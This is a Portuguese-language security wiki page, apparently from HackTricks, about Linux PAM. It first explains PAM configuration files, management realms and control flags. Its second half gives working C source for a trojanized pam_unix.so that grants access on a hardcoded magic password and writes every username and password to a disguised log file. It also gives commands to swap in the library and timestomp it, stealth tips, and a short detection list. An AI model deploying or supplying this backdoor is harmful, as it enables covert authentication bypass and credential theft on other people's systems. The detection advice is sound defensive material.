# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informações Básicas

**PAM (Pluggable Authentication Modules)** atua como um mecanismo de segurança que **verifica a identidade dos usuários que tentam acessar serviços de computador**, controlando seu acesso com base em vários critérios. É semelhante a um porteiro digital, garantindo que apenas usuários autorizados possam interagir com serviços específicos, enquanto potencialmente limita seu uso para evitar sobrecargas no sistema.

#### Arquivos de Configuração

- **Sistemas Solaris e baseados em UNIX** normalmente utilizam um arquivo de configuração central localizado em `/etc/pam.conf`.
- **Sistemas Linux** preferem uma abordagem de diretório, armazenando configurações específicas de serviços dentro de `/etc/pam.d`. Por exemplo, o arquivo de configuração para o serviço de login é encontrado em `/etc/pam.d/login`.

Um exemplo de configuração PAM para o serviço de login pode parecer assim:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Reinos de Gerenciamento PAM**

Esses reinos, ou grupos de gerenciamento, incluem **auth**, **account**, **password** e **session**, cada um responsável por diferentes aspectos do processo de autenticação e gerenciamento de sessão:

- **Auth**: Valida a identidade do usuário, frequentemente solicitando uma senha.
- **Account**: Trata da verificação da conta, checando condições como associação a grupos ou restrições de horário.
- **Password**: Gerencia atualizações de senha, incluindo verificações de complexidade ou prevenção contra ataques de dicionário.
- **Session**: Gerencia ações durante o início ou fim de uma sessão de serviço, como montar diretórios ou definir limites de recursos.

#### **Controles do Módulo PAM**

Os controles ditam a resposta do módulo ao sucesso ou falha, influenciando o processo geral de autenticação. Estes incluem:

- **Required**: A falha de um módulo requerido resulta em falha eventual, mas somente após todos os módulos subsequentes serem verificados.
- **Requisite**: Término imediato do processo em caso de falha.
- **Sufficient**: O sucesso ignora as demais verificações do mesmo reino, a menos que um módulo subsequente falhe.
- **Optional**: Causa falha apenas se for o único módulo na pilha.

#### Exemplo de Cenário

Em uma configuração com múltiplos módulos de autenticação, o processo segue uma ordem rigorosa. Se o módulo `pam_securetty` encontrar o terminal de login não autorizado, logins de root são bloqueados, mas todos os módulos ainda são processados devido ao seu status de "required". O `pam_env` define variáveis de ambiente, potencialmente ajudando na experiência do usuário. Os módulos `pam_ldap` e `pam_unix` trabalham juntos para autenticar o usuário, com `pam_unix` tentando usar uma senha fornecida anteriormente, aumentando a eficiência e flexibilidade nos métodos de autenticação.

## Backdooring PAM – Hooking `pam_unix.so`

Um truque clássico de persistência em ambientes Linux de alto valor é **trocar a biblioteca PAM legítima por um drop-in trojanizado**. Como cada login SSH / console acaba chamando `pam_unix.so:pam_sm_authenticate()`, algumas linhas de C são suficientes para capturar credenciais ou implementar um bypass de senha *mágico*.

### Compilação Cheatsheet
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
Compilar e substituir de forma furtiva:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Dicas de OpSec
1. **Sobrescrita atômica** – escreva em um arquivo temporário e `mv` para o lugar para evitar bibliotecas meio escritas que bloqueiam o SSH.
2. Colocação de arquivos de log como `/usr/bin/.dbus.log` se mistura com artefatos de desktop legítimos.
3. Mantenha as exportações de símbolos idênticas (`pam_sm_setcred`, etc.) para evitar mau comportamento do PAM.

### Detecção
* Compare MD5/SHA256 de `pam_unix.so` com o pacote da distribuição.
* Verifique se há permissões de escrita global ou propriedade incomum em `/lib/security/`.
* Regra do `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.

### Referências

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltração de Redes de Telecomunicações Globais](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
